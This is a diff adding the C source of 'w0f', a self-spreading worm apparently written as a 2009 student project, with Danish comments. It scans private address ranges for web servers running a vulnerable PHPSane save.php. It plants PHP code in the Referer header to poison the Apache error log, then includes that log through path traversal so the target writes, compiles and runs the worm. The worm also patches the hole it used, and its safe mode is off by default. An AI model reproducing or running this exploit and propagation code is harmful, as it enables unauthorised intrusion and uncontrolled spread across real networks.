@@ -1,0 +1,689 @@
+#include <sys/socket.h> //for socket(), connect(), send(), recv()
+#include <netinet/in.h>
+#include <stdio.h> //for printf()
+#include <stdlib.h> //for atoi()
+#include <string.h> //for strstr()
+#include <unistd.h> //for close()
+#include <netdb.h> // for gethostbyname()
+#include <fcntl.h> // for nonblocking
+#include <time.h> // for srand() og rand()
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <ifaddrs.h>
+//#include <math.h> // for ceil() <-- behoeves ikke laengere
+
+#define PORT 80
+#define TIMEOUT 500
+
+// Til at kunne køre programmet i sikker tilstand,
+// hvis denne variable er sat til 1, så skal
+// programmet ikke sprede sig, men kun scanne
+static int SafeMode = 0;
+
+//variabel, hvori programmets base64 encoding gemmes
+static char prog_base64[100000];
+
+// Følgende const er til encoding af base64 algoritme
+static const char cb64[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+
+// Deklarerer funktioner
+void attackRange(char * target_range);
+int try_to_w0f(char * target_addr, int target_port, int ms_timeout);
+int ceeil(float inNum);
+int patch();
+int searcher(char * streng, char * bufferstream);
+char *str_replace2(char * needle,char * replace, char * str);
+
+int main(int argc, char **argv){
+
+    if (fopen("/w0faway", "r") != 0) {
+        printf("committing suicide...\n");
+        exit(0);
+    }
+
+    // følgende kode
+    char source_file_name[200];
+    char *tmppp;
+    tmppp = argv[0];
+
+    int y;
+    for (y = 2; y <= strlen(argv[0]); y++) {
+        source_file_name[y-2] = tmppp[y];
+    }
+    sprintf(source_file_name,"%s.c",source_file_name);
+
+    printf("\n         _______   _____  \n"
+           " __  _  _\\   _  \\_/ ____\\ \n"
+           " \\ \\/ \\/ /  /_\\  \\   __\\  \n"
+           "  \\     /\\  \\_/   \\  |    \n"
+           "   \\/\\_/  \\_____  /__|    version 4rebuild\n"
+           "                \\/        \n"
+           "      automated version\n"
+           "      by a217 <sw1a217@tnb.aau.dk>\n");
+
+    if (SafeMode == 0) {
+       printf(" !!!  SAFE-MODE IS OFF  !!! \n");
+    } else {
+       printf("      SAFE-MODE is ON\n");
+    }
+    printf("\n");
+
+    printf("[ ] Trying to patch PHPSane v0.5 vulnerability ...\n");
+
+    sleep(3);
+    if (patch() == 0) {
+        printf("[+] Successfully patched local vulnerability. This server is now SECURE!\n");
+    } else {
+        printf("[!] Warning; Could not patch vulnerbaility! Perhaps it is already patched?\n");
+    }
+
+
+    //denne del kode indlaeser det binære program, og encoder det til Base64 og gemmer i variablen prog_base64
+    int opt = 0;
+    int retcode = 0;
+    int linesize = 40;
+    char *infilename = NULL;
+
+    FILE *infile;
+    FILE *outfile;
+    infilename = source_file_name;
+    infile = fopen( infilename, "rb" );
+
+    int counter = 0;
+    unsigned char in[3], out[4];
+    int i, len;
+
+    while( !feof( infile ) ) {
+        len = 0;
+        for( i = 0; i < 3; i++ ) {
+            in[i] = (unsigned char) getc( infile );
+            if( !feof( infile ) ) {
+                len++;
+            }
+            else {
+                in[i] = 0;
+            }
+        }
+        if( len ) {
+            out[0] = cb64[ in[0] >> 2 ];
+            out[1] = cb64[ ((in[0] & 0x03) << 4) | ((in[1] & 0xf0) >> 4) ];
+            out[2] = (unsigned char) (len > 1 ? cb64[ ((in[1] & 0x0f) << 2) | ((in[2] & 0xc0) >> 6) ] : '=');
+            out[3] = (unsigned char) (len > 2 ? cb64[ in[2] & 0x3f ] : '=');
+            for( i = 0; i < 4; i++ ) {
+                prog_base64[counter] = out[i];
+                counter++;
+            }
+        }
+    }
+
+
+    ///////////
+    // Denne kode henter computerens tildelte IP-addresser, og gemmer dem i variablen, host
+    // Hentet fra http://www.kernel.org/doc/man-pages/online/pages/man3/getifaddrs.3.html
+    struct ifaddrs *ifaddr, *ifa;
+    int family, s;
+    char host[NI_MAXHOST];
+
+    char doomArray[16][20];
+    //int i;
+    int numOfCards = 0;
+
+    if (getifaddrs(&ifaddr) == -1) {
+       perror("getifaddrs");
+       exit(-1);
+    }
+
+    // Walk through linked list, maintaining head pointer so we
+    //  can free list later
+    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+        family = ifa->ifa_addr->sa_family;
+
+        if (family == AF_INET ) { //|| family == AF_INET6
+            s = getnameinfo(ifa->ifa_addr,
+                   (family == AF_INET) ? sizeof(struct sockaddr_in) :
+                                         sizeof(struct sockaddr_in6),
+                   host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
+            if (s != 0) {
+               //printf("getnameinfo() failed: %s\n", gai_strerror(s));
+               exit(-1);
+            }
+
+            //if (strcmp(ifa->ifa_name,"lo") != 0){ // vi gider ikke 127.0.0.1, da vi ikke kan bruge den til noget.
+                //printf("%s\n", host);
+                for (i=0; i<=strlen(host); i++) {
+                    doomArray[numOfCards][i] = host[i];
+
+                }
+                numOfCards++;
+            //}
+        }
+    }
+    freeifaddrs(ifaddr);
+
+    int p;
+    for (p=0; p < numOfCards; p++) {
+        printf("Running interface %d/%d: %s\n",(p+1),numOfCards,doomArray[p]);
+
+        int firstPart;
+        firstPart = atoi(strtok(doomArray[p],"."));
+
+        /******************************************
+        http://www.duxcw.com/faq/network/privip.htm
+        The Internet Assigned Numbers Authority
+        (IANA) has reserved the following three
+        blocks of the IP address space for
+        private internets (local networks):
+
+        10.0.0.0 - 10.255.255.255
+        172.16.0.0 - 172.31.255.255
+        192.168.0.0 - 192.168.255.255
+        Also, IP addresses in the range of
+        169.254.0.0 -169.254.255.255
+
+        are reserved for Automatic Private
+        IP Addressing.
+        ******************************************/
+
+         switch(firstPart){
+            case  10: attackRange("10");                        break;
+            case 172: attackRange("172");                       break;
+            case 192: attackRange("192");                       break;
+            case 169: attackRange("169");                       break;
+            default: printf("Incorrect IP: %d ignoring...\n",firstPart);    break;
+        }
+    }
+}
+
+//Angriber en range af ip-addresser, og prøver på at sprede sig via disse, KUN HVIS SAFEMODE = 0
+void attackRange(char * target_range){
+
+    char * ipAMin;
+    char * ipAMax;
+    char * ipBMin = "66";
+    char * ipBMax ="255";
+    char * ipCMin = "0";
+    char * ipCMax = "255";
+
+    switch (atoi(target_range)){
+        case  10:   ipAMin="8";
+                    ipAMax="255";   break;
+        case 172:   ipAMin = "16";
+                    ipAMax = "31";  break;
+        case 192:   ipAMin = "168";
+                    ipAMax = "168"; break;
+        case 169:   ipAMin = "254";
+                    ipAMax = "254"; break;
+        default:    printf("Internal error!\n");
+                    exit(-1);       break;
+    }
+
+    int a;
+    int b;
+    int c;
+
+    // følgende kode kører ip-rangen igennem, og tester hver vært bas IP-adressen.
+    for (a = atoi(ipAMin); a <= atoi(ipAMax); a++) {
+            char  tmm[16]; // 123.456.789.123 = 15 + \n (sentinel) = 16
+            for (b = atoi(ipBMin); b <= atoi(ipBMax); b++) {
+                    int c;
+                    for (c = atoi(ipCMin); c <= atoi(ipCMax); c++) {
+                            // Samler ip-adressen til én variabel: tmm
+                            sprintf(tmm,"%s.%d.%d.%d",target_range,a,b,c);
+                            //printf("%s\n",tmm);
+                            switch(try_to_w0f(tmm,PORT,TIMEOUT)) {
+                                case  0: /*printf("host %s tcp/%d open\n",tmm, PORT);*/ break;
+                                case -1: printf("[ ] host %s tcp/%d closed\n",tmm, PORT); break;
+                                case -2: printf("[ ] host %s tcp/%d filtered\n",tmm, PORT); break;
+                            }
+                            //printf("[+] Done.\n");
+                    }
+            }
+    }
+}
+
+//Scanner én enkelt port, og hvis den ER vulnerable, så prøver den på at hacke computeren.
+int try_to_w0f(char * target_addr, int target_port, int ms_timeout){
+
+    if (fopen("/w0faway", "r") != 0) {
+        printf("committing suicide...\n");
+        exit(0);
+    }
+
+    struct sockaddr_in servaddr;
+    int s;
+    int q;
+
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_addr.s_addr = inet_addr(target_addr);
+    servaddr.sin_port = htons(target_port);
+
+    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+    fcntl(s, F_SETFL, O_NONBLOCK);
+
+    connect(s, (struct sockaddr *) &servaddr, sizeof(servaddr));
+
+    fd_set rd_fds;
+    fd_set wr_fds;
+    struct timeval tv;
+
+    tv.tv_sec = 0;
+    tv.tv_usec = ms_timeout * 1000;
+
+    FD_ZERO (&rd_fds);
+    FD_ZERO (&wr_fds);
+    FD_SET (s, &wr_fds);
+    FD_SET (s, &rd_fds);
+
+    int res;
+    res = select (s + 1, &rd_fds, &wr_fds, 0, &tv);
+    if (res == 1) {
+        printf("\[+] host %s tcp/%d OPEN!\n",target_addr, target_port);
+        printf("   \[ ] Checking if server is vulnerable...\n");
+
+        char http_request2[5000]; // 329 er den maksimale laengden denne string kan blive.
+
+        sprintf(http_request2,"GET http://127.0.0.1/save.php?file_save=phpsane.php HTTP/1.1\n"//"GET http://127.0.0.1/save.php?file_save=help_1.php HTTP/1.1\n"
+        "Host: %s\n"
+        "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.4) Gecko/20091105 Gentoo Firefox/3.5.4\n"
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n"
+        "Accept-Language: en-us,en;q=0.5\n"
+        "Accept-Charset: utf-8\n"
+        "Connection: Close\n"
+        "Referer: This is an automated auto update scanner called w0f, built by a217 as a p1 project 2009\n\n",target_addr);
+
+        send(s,http_request2,strlen(http_request2),0);
+
+        sleep(1);
+
+        char recvbuf[50000];
+
+        recv(s, recvbuf, sizeof(recvbuf)-1,0);
+
+        sleep(2);
+        close(s);
+
+        if (strstr(recvbuf,"<FORM name=\"menueForm\" action=\"phpsane.php\" method=\"GET\">") != NULL) {
+
+            struct sockaddr_in servaddr;
+            int s;
+
+            servaddr.sin_family = AF_INET;
+            servaddr.sin_addr.s_addr = inet_addr(target_addr);
+            servaddr.sin_port = htons(target_port);
+
+            s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+            fcntl(s, F_SETFL, O_NONBLOCK);
+            connect(s, (struct sockaddr *) &servaddr, sizeof(servaddr));
+
+            sleep(1);
+
+            char http_request[1429];
+            sprintf(http_request,"GET http://127.0.0.1/save.php?file_save=http:// HTTP/1.1\n"//"GET http://127.0.0.1/save.php?file_save=help_1.php HTTP/1.1\n"
+            "Host: %s\n"
+            "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.4) Gecko/20091105 Gentoo Firefox/3.5.4\n"
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n"
+            "Accept-Language: en-us,en;q=0.5\n"
+            "Accept-Charset: utf-8\n"
+            "Connection: Close\n"
+            "Referer: This is an automated auto update scanner called w0f, built by a217 as a p1 project 2009\n\n",target_addr);
+
+            send(s,http_request,strlen(http_request),0);
+
+            sleep(1);
+
+            char recvbuf[50000];
+
+            recv(s, recvbuf, sizeof(recvbuf)-1,0);
+
+            sleep(2);
+            close(s);
+
+            if (strstr(recvbuf,"not legal include -patched by w0f") == NULL) { //"phpSANE: Help") != NULL) {
+                printf("   \[+] test hack/epxloit/check succeeded!, server NOT patched\n");
+                if (SafeMode == 0) {
+                    printf("   \[!] WARNING: SafeMode is OFF, Trying to spread...\n");
+                    printf("   \[ ] Length of encoded w0rm: %d\n",strlen(prog_base64));
+
+                    //følgende 3 linjer genererer vores tilfældige nummer (rand_num)
+                    srand (time(NULL));
+                    unsigned long rand_num;
+                    rand_num = ((rand() % 1000000) + 1);
+
+                    printf("   \[ ] Random number for this session: %lu\n",rand_num);
+
+                    int antalstrenge = ceeil((float)strlen(prog_base64)/5000.0);
+                    //printf("antal : %d\nlaengde %lu\n", antalstrenge, strlen(prog_base64));
+
+                    char test0[5001];
+                    char test1[5001];
+                    char test2[5001];
+                    char test3[5001];
+                    char test4[5001];
+                    char test5[5001];
+                    char test6[5001];
+                    char test7[5001];
+                    char test8[5001];
+                    char test9[5001];
+
+                    char *testArray[] = { test0, test1, test2, test3, test4, test5, test6, test7, test8, test9 };
+                    char teststring[50000];
+                    int n;
+
+                    for (n = 0; n < antalstrenge; n++) {
+                            strncpy(testArray[n], prog_base64+(n*5000), 5000);
+                            strcat(teststring, testArray[n]);
+                    }
+                    if (strncmp(prog_base64, teststring, 500000) == 0){
+                        //printf("\[+] The strings are identical\n");
+                    } else {
+                        printf("   \[!] INTERNAL ERROR: The strings are NOT identical! Smack the dumb ass who programmed me! Quitting...\n");
+                        close(s);
+                        exit(-1);
+                    }
+
+                    // The following code injects the worm into the log
+                    int iii = 0;
+                    for (iii = 0; iii < antalstrenge; iii++) {
+                        //printf("    \[ ] Sending payload %d/%d... (piece %d of worm)\n",(iii+1),(antalstrenge+1),(iii+1));
+                        printf("   \[ ] Injecting worm part %d of %d...\n",(iii+1),antalstrenge);
+
+                        char http_exploit_cmd[100000]; //den maksimale laengden denne string kan blive
+                        sprintf(http_exploit_cmd,"GET /w0fw0f.php HTTP/1.1\n"
+                        "Host: %s\n"
+                        "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.4) Gecko/20091105 Gentoo Firefox/3.5.4\n"
+                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/ /*;q=0.8\n"
+                        "Accept-Language: en-us,en;q=0.5\n"
+                        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n"
+                        "Keep-Alive: 300\n"
+                        "Connection: Close\n"
+                        "Referer: Transfering w0f..<?php $w0fbasestring%lu[] = \"%s\";?>.\n\n",target_addr,rand_num,testArray[iii]);
+
+                        struct sockaddr_in servaddr;
+                        int s;
+
+                        //printf("len: %d\n%s\n",strlen(testArray[iii]),testArray[iii]);
+
+                        servaddr.sin_family = AF_INET;
+                        servaddr.sin_addr.s_addr = inet_addr(target_addr);
+                        servaddr.sin_port = htons(target_port);
+
+                        s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+                        fcntl(s, F_SETFL, O_NONBLOCK);
+                        connect(s, (struct sockaddr *) &servaddr, sizeof(servaddr));
+
+                        sleep(1);
+                        send(s, http_exploit_cmd ,strlen(http_exploit_cmd) ,0);
+
+                        sleep(1);
+                        recv(s, recvbuf, sizeof(recvbuf)-1,0);
+                        sleep(1);
+                        //printf("received: %s\n",recvbuf);
+                        //printf("%s\n",http_exploit_cmd);
+                        close(s);
+                    }
+
+                    printf("   \[ ] Injecting php initialization code...\n");
+
+                    char http_exploit_cmdLAST[100000]; //den maksimale laengden denne string kan blive
+                    sprintf(http_exploit_cmdLAST,"GET /FINALw0f.php HTTP/1.1\n"
+                    "Host: %s\n"
+                    "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.4) Gecko/20091105 Gentoo Firefox/3.5.4\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/ /*;q=0.8\n"
+                    "Accept-Language: en-us,en;q=0.5\n"
+                    "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n"
+                    "Keep-Alive: 300\n"
+                    "Connection: Close\n"
+                    "Referer: <?php for($i=0; $i<count($w0fbasestring%lu); $i++) {$w0fraw%lu .= $w0fbasestring%lu[$i];}$w0fsource = base64_decode($w0fraw%lu);if(!fwrite(fopen('w0f_%lu.c', 'w'), $w0fsource)) {print \"<h1>OMFG ERROR WRITING FILE!! ID: %lu</h1>\";}else {print \"<h1>You have been w0f'ed! Session: %lu</h1>\";system(\"gcc w0f_%lu.c -o w0f_%lu;./w0f_%lu\");}?>\n\n",target_addr,rand_num,rand_num,rand_num,rand_num,rand_num,rand_num,rand_num,rand_num,rand_num,rand_num);
+
+                    struct sockaddr_in servaddr;                       // argv[0] = ./w0f_%lu.c
+                    int s;
+
+                    servaddr.sin_family = AF_INET;
+                    servaddr.sin_addr.s_addr = inet_addr(target_addr);
+                    servaddr.sin_port = htons(target_port);
+
+                    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+                    fcntl(s, F_SETFL, O_NONBLOCK);
+
+                    connect(s, (struct sockaddr *) &servaddr, sizeof(servaddr));
+
+                    sleep(1);
+
+                    send(s, http_exploit_cmdLAST ,strlen(http_exploit_cmdLAST) ,0);
+
+                    sleep(1);
+                    recv(s, recvbuf, sizeof(recvbuf)-1,0);
+                    sleep(1);
+                    //printf("received: %s\n",recvbuf);
+                    //printf("%s\n",http_exploit_cmdLAST);
+                    close(s);
+
+
+                    ////
+                    printf("   \[ ] Building worm...\n");
+                    char http_exploit_cmd_run[100000]; //den maksimale laengden denne string kan blive
+                    sprintf(http_exploit_cmd_run,"GET /save.php?file_save=../../../../var/log/apache2/error_log HTTP/1.1\n"//"GET /save.php?file_save=../../../../Applications/MAMP/logs/apache_error_log HTTP/1.1\n"
+                                                 "Host: %s\n"
+                                                 "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.4) Gecko/20091105 Gentoo Firefox/3.5.4\n"
+                                                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n"
+                                                 "Accept-Language: en-us,en;q=0.5\n"
+                                                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n"
+                                                 "Keep-Alive: 300\n"
+                                                 "Connection: close\n"
+                                                 "Cache-Control: max-age=0\n\n",target_addr);
+                    //struct sockaddr_in servaddr;
+                    //int s;
+
+                    servaddr.sin_family = AF_INET;
+                    servaddr.sin_addr.s_addr = inet_addr(target_addr);
+                    servaddr.sin_port = htons(target_port);
+
+                    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+                    fcntl(s, F_SETFL, O_NONBLOCK);
+
+                    connect(s, (struct sockaddr *) &servaddr, sizeof(servaddr));
+
+                    sleep(1);
+
+                    send(s, http_exploit_cmd_run, strlen(http_exploit_cmd_run) ,0);
+
+                    sleep(1);
+                    recv(s, recvbuf, sizeof(recvbuf)-1,0);
+
+                    sleep(1);
+                    close(s);
+
+                    // checker hvis det gik godt;
+
+                    char success_string[400];
+                    char fail_string[400];
+
+                    sprintf(success_string, "You have been w0f'ed! Session: %lu",rand_num);
+                    sprintf(fail_string, "<h1>OMFG ERROR WRITING FILE!! ID: %lu</h1>",rand_num);
+
+                    if (strstr(recvbuf,success_string) != NULL) {
+                        printf("   \[+] PHP succeeded; but server is NOT patched! Perhaps w0f crashed into a segmentation fault?\n");
+
+                    } else if (strstr(recvbuf,fail_string) != NULL) {
+                        printf("   \[!] Build failed; php code returned error!\n");
+                    } else  {
+                        printf("   \[?] Unkn0wn response from server, Most likely:\n");
+                        printf("       \[-] w0f successfully built, ran & patched webserver, therefor we cannot hack now\n");
+                        printf("       \[-] php script didnt work out as it should.\n");
+                        printf("       \[-] someone patched the server manually\n");
+                        printf("       \[-] unknown error\n");
+                        printf("       \[-] or, your machine blew up...\n");
+                        printf("       \[ ] To be sure, run w0f again against host\n");
+                    }
+                    ////
+                } else {
+                    printf("   \[!] SafeMode is ON, Ignoring vulnerable host.\n");
+                }
+
+            } else {
+                printf("   \[!] Server is already patched by w0f (not me as in I DIDNT DO IT!) (%s:%d)\n",target_addr,target_port);
+            }
+        } else {
+            printf("   \[!] Check failed %s:%d\n",target_addr,target_port);
+        }
+    }
+
+    close(s);
+
+    switch(res) {
+        case 1: return 0; break;
+        case 2: return -1; break;
+        case 0: return -2; break;
+    }
+
+}
+
+// hjemmelavet funktion til at runde op, så vi slipper for at bruge ceil()
+int ceeil(float inNum){
+    // caster vores float til en int, dette gør at vi slipper for ALLE decimaler
+    int i = (int)inNum;
+    // returnerer vores int plus én
+    return (i+1);
+}
+
+
+// denne funktion virker, dog ikke på samme måde som str_replace
+char *str_replace2(char * needle,char * replace, char * str){ // "med","","hejmeddig"))
+
+    char firstpart[4000];
+    char lastpart[4000];
+    char finito[5000];
+    char *ret;
+
+    int i = 0;
+    int j = 0;
+    int wtf = 0;
+    //printf("len: %d\n",strlen(str));
+
+    for (i=0; i < strlen(str); i++) {
+        for (j=0; j < strlen(needle); j++) {
+            if (needle[j] != str[j+i]) {
+                break;
+            }
+
+            if (j == (strlen(needle)-1)){
+                int q;
+                for (q=0; q < i; q++) {
+                    firstpart[q] = str[q];
+                }
+                int n;
+                for (n=(i+j); n < strlen(str); n++) {
+                    lastpart[n-(i+j)] = str[n+1];
+                }
+
+                sprintf(finito,"%s%s%s",firstpart,replace,lastpart);
+            }
+        }
+    }
+    ret = finito;
+    return ret;
+}
+
+int searcher(char * streng, char * bufferstream) {
+    int strenglength = strlen(streng);
+    int bufferlen;
+    if (strenglength < 6) {
+        bufferlen = 6;
+    }
+    else {
+        bufferlen = strenglength;
+    }
+    char buffer[bufferlen];
+    int c;
+    int i;
+    int n;
+    for (n=0; n<strlen(bufferstream); n++) {
+        for (i=0; i<strenglength; i++) {
+            if (bufferstream[n+i] != streng[i]) {
+                bzero(buffer,sizeof(buffer));
+                break;
+            }
+            else {
+                buffer[i] = bufferstream[n+i];
+            }
+            if (i == (strenglength-1)) {
+                return 1;
+            }
+        }
+    }
+
+    return 0;
+}
+
+
+// Funktion der prøver på at patche sårbarheden i phpSANE, returner 0 hvis det virker, og et negativt tal hvis det gav en fejl. Se kode
+int patch(){
+    char *buffer;
+    FILE * pFile;
+    int lSize;
+    size_t result;
+    char * midlertidigfil;
+    // Ã¥ben filen "save.php" i "read" og lÃ¦g den i FILE variablen pFile.
+    pFile = fopen("save.php","r");
+    // tjek om filen bliver Ã¥bnet korrekt ellers returner -3.
+    if (pFile==NULL) {
+        fputs ("File error",stderr);
+        return -3;
+    }
+    // sÃ¦t "positions indikatoren" i slutningen af filen
+    fseek (pFile , 0 , SEEK_END);
+    // gem stÃ¸rrelsen af filen i variablen lSize
+    lSize = ftell (pFile);
+    // gÃ¥ tilbage til starten af filen
+    rewind (pFile);
+    // alloker hukommelse til array'et "buffer" med stÃ¸rrelsen lSize
+    buffer = (char*) malloc (sizeof(char)*lSize);
+    // tjek om allokeringen lykkedes ellers returner -2
+    if (buffer == NULL) {
+        fputs ("Memory error",stderr);
+        return -2;
+    }
+    // kopier den Ã¥bne fil ind i array'et buffer
+    result = fread (buffer,1,lSize,pFile);
+    // tjek om stÃ¸rrelsen pÃ¥ filen og array'et buffer er identisk ellers returner -1
+    if (result != lSize) {
+        fputs ("Reading error",stderr);
+        return -1;
+    }
+    // luk filen, da vi ikke lÃ¦ngere skal lÃ¦se fra den
+    fclose (pFile);
+
+    // opret to strenge med hvad vi skal erstatte og hvad vi skal erstatte med, kaldet hhv. needle og replacement.
+    char * needle = "$file_save = $_GET['file_save'];";
+    char * replacement = "$file_save = $_GET['file_save']; if(strstr($file_save, '../') == true || strstr($file_save, 'http://') == true) { die('not legal include -patched by w0f'); } // patched by w0f";
+
+    // tjek fÃ¸rst om replacement er i filen
+    if(searcher(replacement, buffer) == 0) {
+        // dernÃ¦st tjek om needle er i filen
+     	if(searcher(needle, buffer) == 1) {
+            // erstat needle med replacement i buffer og gem det til et midlertidigt array
+            midlertidigfil = str_replace2(needle, replacement, buffer);
+            // Ã¥ben "save.php" igen, denne gang med intentionen om at skrive i filen
+            pFile = fopen("save.php", "w");
+            // skriv array'et "midlertidigfil" til filen vi lige har Ã¥bnet, hvis der forekommer fejl skriv det pÃ¥ skÃ¦rmen
+            if (fputs(midlertidigfil,pFile) != 0 ) {
+                printf("Error writing save.php\n");
+            }
+            // luk filen igen
+            fclose (pFile);
+        }
+    } else {
+        // i tilfÃ¦lde af, at replacement allerede var i filen sÃ¥ frigÃ¸r den hukommelse vi allokerede til "buffer" og returner -4
+        free (buffer);
+        return -4;
+    }
+    // hvis alt gÃ¥r godt, sÃ¥ frigÃ¸r hukommelsen der blev allokeret til "buffer" og returner 0.
+    free (buffer);
+    return 0;
+}
